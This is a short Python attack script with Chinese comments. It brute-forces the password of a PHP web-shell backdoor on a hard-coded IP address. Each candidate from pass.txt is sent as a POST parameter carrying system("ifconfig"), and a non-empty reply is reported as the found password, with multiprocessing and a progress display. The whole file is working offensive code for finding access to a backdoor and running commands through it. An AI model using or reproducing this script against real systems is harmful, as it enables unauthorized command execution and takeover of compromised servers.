#coding:utf8
#author: Jeffery.Yu
import requests,os,time
from multiprocessing import Pool,Manager

def action(passwd,finishq,q):
	url='http://192.200.254.224'
	data={passwd:'system("ifconfig");'}
	urlpost=requests.post(url,data=data)
	if len(urlpost.text)>0:
		#print('found password:%s' %passwd)
		q.put(passwd)
	finishq.put(passwd)

def main():
	#1.获取密码的总数
	result=os.popen("wc -l pass.txt  |awk -F' ' '{print $1}'")
	PassNum=int(result.read())

	#读取文件放入进程处理
	f=open('pass.txt')
	pool=Pool(4)
	outq=Manager().Queue()
	finishq=Manager().Queue()
	for passwd in f:
		passwd=passwd.strip()
		p=pool.apply_async(action,args=(passwd,finishq,outq))
	f.close()

	#主进程判断当前的进度和完成的情况
	num=0
	while num < PassNum:
		num=finishq.qsize()
		rate=num/PassNum
		print("\r[*]finish: %.5s%%" %(rate*100),end='')
		time.sleep(0.5)
	print()
	if outq.empty():
		print("[-] NOT Found!")
	else:
		print("[+] Found Password: %s" %outq.get())
		


if __name__=="__main__":
	main()
